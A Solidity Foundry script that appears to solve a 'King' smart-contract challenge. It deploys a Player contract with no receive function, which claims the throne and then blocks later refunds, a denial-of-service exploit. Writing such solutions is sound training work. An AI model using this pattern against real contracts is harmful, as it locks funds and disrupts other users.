// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Script, console} from "forge-std/Script.sol";

contract Solver is Script {
    address payable king = payable(vm.envAddress("KING_INSTANCE"));

    function setUp() public {}

    function run() public {
        vm.startBroadcast(vm.envUint("PRIV_KEY"));

        (, bytes memory data) = king.call(abi.encodeWithSignature("prize()"));
        uint256 current_prize = uint256(bytes32(data));

        new Player{value: current_prize}(king);

        vm.stopBroadcast();
    }
}

contract Player {
    constructor(address payable instance) payable {
        instance.call{value: address(this).balance}("");
    }
}